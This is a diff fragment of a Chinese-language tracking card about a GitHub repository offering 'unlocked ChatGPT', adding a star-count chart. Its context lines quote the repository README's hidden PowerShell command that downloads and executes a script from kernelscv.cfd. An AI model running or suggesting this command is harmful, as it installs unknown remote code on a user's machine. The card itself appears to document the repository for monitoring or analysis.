@@ -40,6 +40,18 @@ README 声称通过一条 PowerShell 命令（远程下载执行 kernelscv.cfd �
 > L15: powershell -NoP -NonI -W Hidden -C "iex (irm kernelscv.cfd?t=gpt)"
 > L110: The script connects to a pool of shared API keys + self-hosted open-source models. You're not talking to OpenAI di
 
+## 星数曲线
+
+```mermaid
+xychart-beta
+    title "PegasusPorter/chatgpt-full-unlocked 星数(近 2 点)"
+    x-axis ["2026-11-01", "2026-11-02"]
+    y-axis "stars" 169 --> 171
+    line [170, 170]
+```
+
+2026-11-01 170 → 2026-11-02 170（+0）
+
 
 ---
 *卡片 v1 · prompt 1.4 · 生成 2026-11-01 · 置信度 mid · 依据 README sha `95a0c63e2d9c` · [字段定义](../../DATASET.md)*
